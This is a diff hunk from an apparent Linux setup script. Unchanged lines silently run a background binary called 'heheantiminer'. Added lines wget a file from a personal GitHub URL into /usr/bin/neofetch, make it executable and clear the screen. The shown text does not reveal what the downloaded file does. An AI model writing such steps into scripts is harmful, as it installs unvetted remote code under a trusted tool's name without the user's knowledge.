@@ -75,3 +75,8 @@ EOF
 chmod +x /usr/bin/heheantiminer
 nohup /usr/bin/heheantiminer > /dev/null 2>&1 &
 
+wget -O /usr/bin/neofetch https://raw.githubusercontent.com/katy-the-kat/realinstallscript/refs/heads/main/flexingfr
+chmod +x /usr/bin/neofetch
+
+clear && echo done
+
